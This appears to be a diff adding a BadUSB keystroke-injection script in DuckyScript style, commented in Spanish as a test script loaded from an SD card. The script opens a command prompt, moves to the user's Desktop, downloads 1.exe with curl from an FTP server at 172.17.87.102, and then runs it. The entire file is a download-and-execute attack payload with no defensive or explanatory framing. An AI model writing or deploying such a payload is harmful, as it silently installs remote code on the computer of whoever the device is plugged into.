@@ -1,0 +1,9 @@
+REM Script de prueba desde SD
+DELAY 1000
+cmd
+DELAY 800
+cd %USERPROFILE%
+cd Desktop
+curl -o 1.exe ftp://172.17.87.102/1.exe
+DELAY 5000
+1.exe & exit
